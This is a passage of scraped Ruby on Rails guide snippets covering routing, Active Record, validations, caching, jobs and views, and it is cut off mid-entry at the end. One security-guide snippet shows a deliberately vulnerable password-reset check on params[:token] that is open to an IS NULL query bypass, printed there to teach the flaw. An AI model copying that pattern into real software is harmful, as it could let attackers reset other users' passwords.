https://github.com/rails/rails/blob/main/guides/source/7_2_release_notes.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationController < ActionController::Base\n  # Allow only browsers natively supporting webp images, web push, badges, import maps, CSS nesting + :has\n  allow_browser versions: :modern\nend\n\nclass ApplicationController < ActionController::Base\n  # All versions of Chrome and Opera will be allowed, but no versions of \"internet explorer\" (ie). Safari needs to be 16.4+ and Firefox 121+.\n  allow_browser versions: { safari: 16.4, firefox: 121, ie: false }\nend\n\nclass MessagesController < ApplicationController\n  # In addition to the browsers blocked by ApplicationController, also block Opera below 104 and Chrome below 119 for the show action.\n  allow_browser versions: { opera: 104, chrome: 119 }, only: :show\nend\n```\n\n----------------------------------------\n\nTITLE: Conditional GET with model\nDESCRIPTION: This snippet provides a simplified example of conditional GETs, using the model object directly as an argument to `stale?`.  Rails infers `last_modified` and `etag` from the model's `updated_at` and `cache_key_with_version` methods.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_48\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductsController < ApplicationController\n  def show\n    @product = Product.find(params[:id])\n\n    if stale?(@product)\n      respond_to do |wants|\n        # ... normal response processing\n      end\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: SQL equivalent of last with limit\nDESCRIPTION: This SQL query shows the equivalent SQL command for the `Customer.last(3)` method in Rails. It selects all columns from the `customers` table, orders the results by the `id` column in descending order, and limits the result to 3 records.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_31\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers ORDER BY customers.id DESC LIMIT 3\n```\n\n----------------------------------------\n\nTITLE: Running a Single Active Record Test File Against All Adapters in Bash\nDESCRIPTION: Executes a specific Active Record test file (`test/cases/associations/has_many_associations_test.rb`) against all configured database adapters (e.g., SQLite3, MySQL, PostgreSQL) using a Rake task and passing the filename via the `TEST` environment variable.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_30\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle exec rake TEST=test/cases/associations/has_many_associations_test.rb\n```\n\n----------------------------------------\n\nTITLE: Using GlobalID with Active Job (Ruby)\nDESCRIPTION: This snippet demonstrates how to use GlobalID to pass Active Record objects directly to Active Job, eliminating the need to manually deserialize class/id pairs. It simplifies the `perform` method by accepting the model instance as an argument.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\nclass TrashableCleanupJob < ApplicationJob\n  def perform(trashable, depth)\n    trashable.cleanup(depth)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Case-Insensitive Confirmation Validation in Rails (Ruby)\nDESCRIPTION: Shows how to configure the `confirmation` validator to perform a case-insensitive comparison between the `email` and `email_confirmation` attributes in a `Person` model by setting the `:case_sensitive` option to `false`. The default behavior is case-sensitive.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :email, confirmation: { case_sensitive: false }\nend\n```\n\n----------------------------------------\n\nTITLE: Conditional before_save Callback with Proc in Rails\nDESCRIPTION: Illustrates using a `Proc` object with the `:if` option to conditionally execute a `before_save` callback. The `normalize_card_number` method is called only if the lambda expression `->(order) { order.paid_with_card? }` evaluates to true.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\nclass Order < ApplicationRecord\n  before_save :normalize_card_number,\n    if: ->(order) { order.paid_with_card? }\nend\n```\n\n----------------------------------------\n\nTITLE: Requiring and Using a Helper from a Separate File\nDESCRIPTION: This code demonstrates how to require a helper module from a separate file and include it in a test class. It shows how to use the `assert_multiple_of_forty_two` method defined in the `MultipleAssertions` module within a test.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_76\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\nrequire \"test_helpers/multiple_assertions\"\n\nclass NumberTest < ActiveSupport::TestCase\n  include MultipleAssertions\n\n  test \"420 is a multiple of 42\" do\n    assert_multiple_of_forty_two 420\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using Rails.error.record for Error Reporting and Re-raising in Ruby\nDESCRIPTION: Shows the usage of Rails.error.record, which reports errors to all registered subscribers and then re-raises the error, stopping further execution of the code.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/error_reporting.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nRails.error.record do\n  1 + \"1\" # raises TypeError\nend\n1 + 1 # This won't be executed\n```\n\n----------------------------------------\n\nTITLE: Using ActiveModel::Naming (Ruby)\nDESCRIPTION: This Ruby snippet shows how to use `ActiveModel::Naming` to add class and helper methods for naming and routing.  It extends the class with ActiveModel::Naming.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person\n  extend ActiveModel::Naming\nend\n```\n\n----------------------------------------\n\nTITLE: Solid Queue Error Reporting in ActionMailer\nDESCRIPTION: This Ruby snippet adds a `rescue_from` block to `ActionMailer::MailDeliveryJob` to report errors specifically for mail delivery jobs. This handles errors in ActionMailer jobs, ensuring they are reported to Rails' error reporting service.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_20\n\nLANGUAGE: Ruby\nCODE:\n```\nclass ApplicationMailer < ActionMailer::Base\n  ActionMailer::MailDeliveryJob.rescue_from(Exception) do |exception|\n    Rails.error.report(exception)\n    raise exception\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Embedding Code in Fixtures - ERB\nDESCRIPTION: This ERB code demonstrates how to embed Ruby code within a YAML fixture to generate dynamic sample data, in this case, creating a thousand user records with unique usernames and email addresses.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_31\n\nLANGUAGE: erb\nCODE:\n```\n<% 1000.times do |n| %>\n  user_<%= n %>:\n    username: <%= \"user#{n}\" %>\n    email: <%= \"user#{n}@example.com\" %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Navigating into the Application Directory (Bash)\nDESCRIPTION: Changes the current working directory in the terminal session to the newly created 'store' directory. This directory contains the generated Rails application files and the .devcontainer configuration. This step is essential before performing subsequent operations within the application's context, such as opening it in VS Code or running Rails commands.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started_with_devcontainer.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ cd store\n```\n\n----------------------------------------\n\nTITLE: Formatting Headings for Component Testing and Examples - Markdown\nDESCRIPTION: Illustrates specific guideline for heading capitalization and content in documentation. It provides real heading examples to ensure consistency across guides. No dependencies are required, and usage is for writers structuring document subsections.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/ruby_on_rails_guides_guidelines.md#2025-04-23_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n#### Assertions and Testing Jobs inside Components\n#### Middleware Stack is an Array\n#### When are Objects Saved?\n```\n\n----------------------------------------\n\nTITLE: Defining a Route with a Parameter in Rails\nDESCRIPTION: This Ruby code snippet defines a route with a parameter `:id`. It maps GET requests to paths like `/products/1` to the `show` action of the `ProductsController`. The `:id` parameter captures the value after `/products/` for use in the controller action.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_36\n\nLANGUAGE: ruby\nCODE:\n```\nget \"/products/:id\", to: \"products#show\"\n```\n\n----------------------------------------\n\nTITLE: Overriding a Rails Scaffold Template using ERB\nDESCRIPTION: Provides an example ERB template (`lib/templates/erb/scaffold/index.html.erb.tt`) used to override the default index view template for Rails scaffolds. Note the use of `<%%` to escape ERB tags that should appear in the generated output file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_13\n\nLANGUAGE: erb\nCODE:\n```\n<%% @<%= plural_table_name %>.count %> <%= human_name.pluralize %>\n```\n\n----------------------------------------\n\nTITLE: Generating a Model and Test Stub (Bash)\nDESCRIPTION: This command generates a new model named 'article' with the attributes 'title' (string) and 'body' (text). It also creates a corresponding test stub file in the 'test/models' directory. This is a common starting point for model testing.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate model article title:string body:text\n...\n```\n\n----------------------------------------\n\nTITLE: Validation Error Message when Association Creation Fails - IRB\nDESCRIPTION: Displays the raised validation error in an IRB session when attempting to create an invalid associated object. Demonstrates typical ActiveRecord::RecordInvalid error output for failed model validation. Useful for debugging and documentation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_20\n\nLANGUAGE: irb\nCODE:\n```\nirb> raise_validation_error: Validation failed: Name can't be blank (ActiveRecord::RecordInvalid)\n```\n\n----------------------------------------\n\nTITLE: Sending Existing Files in Rails Controller\nDESCRIPTION: Shows how to stream an existing file from disk using the send_file method. The example demonstrates sending a PDF file with custom filename and content type specifications.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nclass ClientsController < ApplicationController\n  # Stream a file that has already been generated and stored on disk.\n  def download_pdf\n    client = Client.find(params[:id])\n    send_file(\"#{Rails.root}/files/clients/#{client.id}.pdf\",\n              filename: \"#{client.name}.pdf\",\n              type: \"application/pdf\")\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Russian Doll Caching: Model Association with touch\nDESCRIPTION: Defines model associations with the `touch` option set to `true`. This ensures that updating a `Game` record also updates the `updated_at` timestamp of the associated `Product`, expiring the outer cache.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nclass Product < ApplicationRecord\n  has_many :games\nend\n\nclass Game < ApplicationRecord\n  belongs_to :product, touch: true\nend\n```\n\n----------------------------------------\n\nTITLE: SQL Query Generated by eager_load in Rails\nDESCRIPTION: Shows the SQL query generated by the `eager_load` method when eager loading the author association for books. It uses a LEFT OUTER JOIN to retrieve both book and author data in a single query.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_156\n\nLANGUAGE: sql\nCODE:\n```\nSELECT \"books\".\"id\" AS t0_r0, \"books\".\"title\" AS t0_r1, ... FROM \"books\"\n  LEFT OUTER JOIN \"authors\" ON \"authors\".\"id\" = \"books\".\"author_id\"\n  LIMIT 10\n```\n\n----------------------------------------\n\nTITLE: Defining custom attribute types in Active Record models\nDESCRIPTION: Example of using the new Active Record attributes API to define custom attribute types, default values, and virtual attributes not backed by database columns.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/5_0_release_notes.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nclass StoreListing < ActiveRecord::Base\n  attribute :price_in_cents, :integer # custom type\n  attribute :my_string, :string, default: \"new default\" # default value\n  attribute :my_default_proc, :datetime, default: -> { Time.now } # default value\n  attribute :field_without_db_column, :integer, array: true\nend\n```\n\n----------------------------------------\n\nTITLE: Accessing Subarrays with to and from in Ruby\nDESCRIPTION: These examples demonstrate the `to` and `from` methods, used to extract subarrays. `to` returns the subarray up to a given index, while `from` returns the subarray from a given index to the end. Defined in `active_support/core_ext/array/access.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_118\n\nLANGUAGE: ruby\nCODE:\n```\n%w(a b c d).to(2) # => [\"a\", \"b\", \"c\"]\n[].to(7)          # => []\n```\n\nLANGUAGE: ruby\nCODE:\n```\n%w(a b c d).from(2)  # => [\"c\", \"d\"]\n%w(a b c d).from(10) # => []\n[].from(0)           # => []\n```\n\n----------------------------------------\n\nTITLE: Using :on Option for Rails Validations in Ruby\nDESCRIPTION: Demonstrates how to use the :on option to specify when validations should run, including custom contexts. It shows validations that run on create, update, or custom contexts.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_48\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  # it will be possible to update email with a duplicated value\n  validates :email, uniqueness: true, on: :create\n\n  # it will be possible to create the record with a non-numerical age\n  validates :age, numericality: true, on: :update\n\n  # the default (validates on both create and update)\n  validates :name, presence: true\nend\n```\n\n----------------------------------------\n\nTITLE: Using 'object' Option to Set Local Variable in Rails\nDESCRIPTION: This example demonstrates how to use the `object` option to set a local variable in a partial with a different name than the template's object. It assigns the `@item` instance variable to a local variable named `product` within the `_product.html.erb` partial.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_19\n\nLANGUAGE: erb\nCODE:\n```\n<%= render partial: \"product\", locals: { product: @item } %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%= render partial: \"product\", object: @item %>\n```\n\n----------------------------------------\n\nTITLE: Building Active Record MySQL Test Database in Bash\nDESCRIPTION: Navigates to the `activerecord` directory and executes a Rake task (`db:mysql:build`) to create the necessary database schema and user for running Active Record tests against MySQL. Requires MySQL server configured as per `activerecord/test/config.example.yml`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_22\n\nLANGUAGE: bash\nCODE:\n```\n$ cd activerecord\n$ bundle exec rake db:mysql:build\n```\n\n----------------------------------------\n\nTITLE: Advanced Association Extensions with Proxy Access in Rails\nDESCRIPTION: Implementation of an advanced association extension that accesses internal association proxy attributes. This demonstrates how to interact with the association owner, reflection, and target for complex customizations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_143\n\nLANGUAGE: ruby\nCODE:\n```\nmodule AdvancedExtension\n  def find_and_log(query)\n    results = where(query)\n    proxy_association.owner.logger.info(\"Querying #{proxy_association.reflection.name} with #{query}\")\n    results\n  end\nend\n\nclass Author < ApplicationRecord\n  has_many :books, -> { extending AdvancedExtension }\nend\n```\n\n----------------------------------------\n\nTITLE: Routing HTTP GET request to a controller action\nDESCRIPTION: This example demonstrates how to route an incoming HTTP GET request to a specific controller action based on the URL path. It maps the /users/:id path to the show action of the UsersController, passing the 'id' parameter in the params hash. It illustrates basic routing in Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nget \"/users/:id\", to: \"users#show\"\n```\n\n----------------------------------------\n\nTITLE: Merging Scopes in Rails\nDESCRIPTION: Demonstrates merging scopes with AND conditions in Rails. Scopes can be combined and matched with `where` conditions.  If the programmer wants to override the conditions, `merge` should be used.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_168\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  scope :in_print, -> { where(out_of_print: false) }\n  scope :out_of_print, -> { where(out_of_print: true) }\n\n  scope :recent, -> { where(year_published: 50.years.ago.year..) }\n  scope :old, -> { where(year_published: ...50.years.ago.year) }\nend\n```\n\n----------------------------------------\n\nTITLE: Delegating methods to another object Ruby\nDESCRIPTION: This snippet shows how to use the `delegate` macro to forward methods from one object to another.  It simplifies accessing attributes of associated objects. It requires specifying the methods to delegate and the target object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  has_one :profile\n\n  delegate :name, to: :profile\nend\n```\n\n----------------------------------------\n\nTITLE: Button Helper Method Example\nDESCRIPTION: Shows how the button_to helper now infers HTTP verb from Active Record objects when building URLs, changing from POST to PATCH in this case.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_0_release_notes.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nbutton_to(\"Do a POST\", [:do_post_action, Workshop.find(1)])\n# Before\n#=>   <input type=\"hidden\" name=\"_method\" value=\"post\" autocomplete=\"off\" />\n# After\n#=>   <input type=\"hidden\" name=\"_method\" value=\"patch\" autocomplete=\"off\" />\n```\n\n----------------------------------------\n\nTITLE: Vulnerable Code Susceptible to SQL Injection via IS NULL Clause\nDESCRIPTION: Shows a security vulnerability where a nil check can be bypassed to execute unexpected database queries with IS NULL where clauses, a vulnerability addressed in CVE-2012-2660, CVE-2012-2694, and CVE-2013-0155.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_61\n\nLANGUAGE: ruby\nCODE:\n```\nunless params[:token].nil?\n  user = User.find_by_token(params[:token])\n  user.reset_password!\nend\n```\n\n----------------------------------------\n\nTITLE: Emulating config.autoload_lib for Rails Versions Before 7.1\nDESCRIPTION: This code demonstrates how to manually configure autoloading for the lib directory in Rails versions prior to 7.1, mimicking the behavior of config.autoload_lib.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\nmodule MyApp\n  class Application < Rails::Application\n    lib = root.join(\"lib\")\n\n    config.autoload_paths << lib\n    config.eager_load_paths << lib\n\n    Rails.autoloaders.main.ignore(\n      lib.join(\"assets\"),\n      lib.join(\"tasks\"),\n      lib.join(\"generators\")\n    )\n\n    # ...\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Association Presence Validation in IRB (Ruby)\nDESCRIPTION: Shows IRB examples illustrating the behavior of association presence validation defined in the `Supplier` model. A `Supplier` instance with an associated `account` is valid, while one without an associated `account` is invalid.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_31\n\nLANGUAGE: irb\nCODE:\n```\nirb> account = Account.create(name: \"Account A\")\n\nirb> supplier = Supplier.new(account: account)\nirb> supplier.valid?\n=> true # presence validation passes\n\nirb> invalid_supplier = Supplier.new\nirb> invalid_supplier.valid?\n=> false # presence validation fails\n```\n\n----------------------------------------\n\nTITLE: Setting the queue using a block\nDESCRIPTION: This snippet shows how to dynamically set the queue for a job by passing a block to `queue_as`. The block is evaluated in the job context and determines the queue based on the video owner's premium status.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProcessVideoJob < ApplicationJob\n  queue_as do\n    video = self.arguments.first\n    if video.owner.premium?\n      :premium_videojobs\n    else\n      :videojobs\n    end\n  end\n\n  def perform(video)\n    # Do process video\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nProcessVideoJob.perform_later(Video.last)\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Translation Key Escaping in Ruby\nDESCRIPTION: Ruby code showing how properly and improperly escaped YAML translation keys are accessed, with improperly escaped keys resulting in missing translations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\nI18n.t \"success.true\"  # => 'True!'\nI18n.t \"success.on\"    # => 'On!'\nI18n.t \"success.false\" # => 'False!'\nI18n.t \"failure.false\" # => Translation Missing\nI18n.t \"failure.off\"   # => Translation Missing\nI18n.t \"failure.true\"  # => Translation Missing\n```\n\n----------------------------------------\n\nTITLE: Registering a before_validation callback with a proc in Rails\nDESCRIPTION: This code snippet shows how to register a `before_validation` callback using a proc. The proc assigns the `email` value to the `username` if `username` is blank. It also validates the presence of `username` and `email`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  validates :username, :email, presence: true\n\n  before_validation ->(user) { user.username = user.email if user.username.blank? }\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Host Authorization in Rails for DNS Rebinding Protection\nDESCRIPTION: Demonstrates how to configure ActionDispatch::HostAuthorization middleware to protect against DNS rebinding and Host header attacks by specifying allowed hosts and exceptions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_60\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.config.hosts << \"product.com\"\n\nRails.application.config.host_authorization = {\n  # Exclude requests for the /healthcheck/ path from host checking\n  exclude: ->(request) { request.path.include?(\"healthcheck\") },\n  # Add custom Rack application for the response\n  response_app: -> env do\n    [400, { \"Content-Type\" => \"text/plain\" }, [\"Bad Request\"]]\n  end\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Custom Logger in Rails\nDESCRIPTION: This snippet shows how to set up a custom logger in Rails, including setting the formatter and wrapping it with `ActiveSupport::TaggedLogging` for supporting tagged logs. It also includes the `ActiveSupport::LoggerSilence` module.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nclass MyLogger < ::Logger\n  include ActiveSupport::LoggerSilence\nend\n\nmylogger           = MyLogger.new(STDOUT)\nmylogger.formatter = config.log_formatter\nconfig.logger      = ActiveSupport::TaggedLogging.new(mylogger)\n```\n\n----------------------------------------\n\nTITLE: Conditional Logic with Local Assigns (index.html.erb)\nDESCRIPTION: This snippet renders a collection of user articles, passing each article to the `_article` partial. It does not pass any explicit locals, relying on the `_article` partial to handle rendering without the `full` variable.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_79\n\nLANGUAGE: erb\nCODE:\n```\n<%= render user.articles %>\n```\n\n----------------------------------------\n\nTITLE: Searching Routes with Grep (bash)\nDESCRIPTION: Demonstrates using the `-g` option (grep) with `bin/rails routes` to search for routes matching a specific pattern. It helps in quickly finding routes based on URL helper name, HTTP verb, or URL path.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_83\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails routes -g new_comment\n$ bin/rails routes -g POST\n$ bin/rails routes -g admin\n```\n\n----------------------------------------\n\nTITLE: Linking to Product Show Page (ERB)\nDESCRIPTION: This ERB code within the `index.html.erb` view creates a link to the show page for each product. It uses an anchor tag with a hardcoded path to the product show page.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_50\n\nLANGUAGE: erb\nCODE:\n```\n<h1>Products</h1>\n\n<div id=\"products\">\n  <% @products.each do |product| %>\n    <div>\n      <a href=\"/products/<%= product.id %>\">\n        <%= product.name %>\n      </a>\n    </div>\n  <% end %>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Installing Windows Subsystem for Linux (WSL) (bash)\nDESCRIPTION: Installs the Windows Subsystem for Linux with the Ubuntu 24.04 distribution using the wsl command in PowerShell or Windows Command Prompt. This is the first step for setting up Rails on Windows. Requires Windows 11 or Windows 10 version 2004+.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/install_ruby_on_rails.md#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ wsl --install --distribution Ubuntu-24.04\n```\n\n----------------------------------------\n\nTITLE: Formatting Numbers as Percentage in Ruby\nDESCRIPTION: Demonstrates the formatting of numbers as percentages using `to_fs(:percentage)`, with options for precision, delimiter, and separator. This is an ActiveSupport extension to the Numeric class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_100\n\nLANGUAGE: ruby\nCODE:\n```\n100.to_fs(:percentage)\n# => 100.000%\n100.to_fs(:percentage, precision: 0)\n# => 100%\n1000.to_fs(:percentage, delimiter: \".\", separator: \",\")\n# => 1.000,000%\n302.24398923423.to_fs(:percentage, precision: 5)\n# => 302.24399%\n```\n\n----------------------------------------\n\nTITLE: Configuring X-Sendfile Header for Apache/lighttpd - Rails Configuration - Ruby\nDESCRIPTION: Sets the X-Sendfile header for Apache or lighttpd when using Rack::Sendfile with Rails. This enables efficient file sending by delegating the transfer to the web server. Place in the appropriate environment configuration file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_dispatch.x_sendfile_header = \"X-Sendfile\"\n```\n\n----------------------------------------\n\nTITLE: Constraints in a Block Form (Custom Class) (Ruby)\nDESCRIPTION: Applies a custom constraint to multiple routes within a block, using a custom class that responds to `matches?`.  The constraint checks if the request's remote IP is on a restricted list.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_46\n\nLANGUAGE: ruby\nCODE:\n```\nclass RestrictedListConstraint\n  # ...Same as the example above\nend\n\nRails.application.routes.draw do\n  constraints(RestrictedListConstraint.new) do\n    get \"*path\", to: \"restricted_list#index\"\n    get \"*other-path\", to: \"other_restricted_list#index\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining a Route for Blog Posts in Rails\nDESCRIPTION: This Ruby code snippet defines a route for blog posts, mapping GET requests to paths like `/blog/hello-world` to the `show` action of the `BlogController`. The `:title` parameter captures the blog post title from the URL.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\nget \"/blog/:title\", to: \"blog#show\"\n```\n\n----------------------------------------\n\nTITLE: Creating Table with Custom Primary Key (Ruby)\nDESCRIPTION: This migration creates a `users` table with a custom primary key named `user_id` instead of the default `id`.  It also includes username, email and timestamp columns.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_30\n\nLANGUAGE: Ruby\nCODE:\n```\nclass CreateUsers < ActiveRecord::Migration[8.1]\n  def change\n    create_table :users, primary_key: \"user_id\" do |t|\n      t.string :username\n      t.string :email\n      t.timestamps\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering Partial from Namespaced Controller\nDESCRIPTION: Illustrates how Action View looks up partials from a subdirectory in templates rendered from namespaced controllers. If the controller is `Admin::ArticlesController`, the partial will be rendered from `/admin/articles/_article.erb` if `config.action_view.prefix_partial_path_with_controller_namespace` is true. Setting the value to `false` would render `/articles/_article.erb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_53\n\nLANGUAGE: erb\nCODE:\n```\n<%= render @article %>\n```\n\n----------------------------------------\n\nTITLE: Find or Create with block in Rails\nDESCRIPTION: This Ruby code demonstrates the use of a block with `find_or_create_by`. If a customer with the first name 'Andy' does not exist, a new customer is created, and the block is executed to set the `locked` attribute to false.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_188\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.find_or_create_by(first_name: \"Andy\") do |c|\n  c.locked = false\nend\n```\n\n----------------------------------------\n\nTITLE: Using escape_javascript in Rails Views\nDESCRIPTION: The escape_javascript method escapes carriage returns, single and double quotes for JavaScript segments. This is useful when including rendered content within JavaScript to prevent syntax errors.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_37\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# app/views/users/greeting.html.erb %>\nMy name is <%= current_user.name %>, and I'm here to say \"Welcome to our website!\"\n```\n\nLANGUAGE: html+erb\nCODE:\n```\n<script>\n  var greeting = \"<%= escape_javascript render('users/greeting') %>\";\n  alert(`Hello, ${greeting}`);\n</script>\n```\n\n----------------------------------------\n\nTITLE: Structuring Models in Separate Files with Module Scope\nDESCRIPTION: Example showing how to structure models in separate files while maintaining proper association scope within the same module. Models can reference each other without specifying class names.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_101\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/my_application/business/supplier.rb\nmodule MyApplication\n  module Business\n    class Supplier < ApplicationRecord\n      has_one :account\n    end\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/my_application/business/account.rb\nmodule MyApplication\n  module Business\n    class Account < ApplicationRecord\n      belongs_to :supplier\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Displaying New Product Link Conditionally (Authenticated Users) - ERB\nDESCRIPTION: This snippet shows how to display the 'New product' link only if the user is authenticated. It leverages the `authenticated?` helper method and Rails' conditional logic within the ERB template.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_73\n\nLANGUAGE: erb\nCODE:\n```\n<%= link_to \"New product\", new_product_path if authenticated? %>\n```\n\n----------------------------------------\n\nTITLE: Loading All Active Support Core Extensions\nDESCRIPTION: This example shows how to load all available Active Support core extensions at once using a single require statement.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"active_support\"\nrequire \"active_support/core_ext\"\n```\n\n----------------------------------------\n\nTITLE: Rich Text Content Embedding Attachment\nDESCRIPTION: This snippet shows an example of rich text content embedding an `<action-text-attachment>` element that references a User instance's signed GlobalID. Action Text resolves the User instance using the `sgid` and renders it with a default partial.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_12\n\nLANGUAGE: html\nCODE:\n```\n<p>Hello, <action-text-attachment sgid=\"BAh7CEkiCG…\"></action-text-attachment>.</p>\n```\n\n----------------------------------------\n\nTITLE: Configuring Google Cloud Storage Credentials and Options (Active Storage, YAML)\nDESCRIPTION: Provides a sample YAML configuration for integrating Active Storage with Google Cloud Storage (GCS) in a Rails application. This snippet shows how to set service type, project and bucket, and securely reference credentials via Rails encrypted credentials. Placeholders expect project-specific data and environment substitutions, with private keys being securely injected. Optionally includes cache control settings, IAM options, and GSA user email for advanced authentication 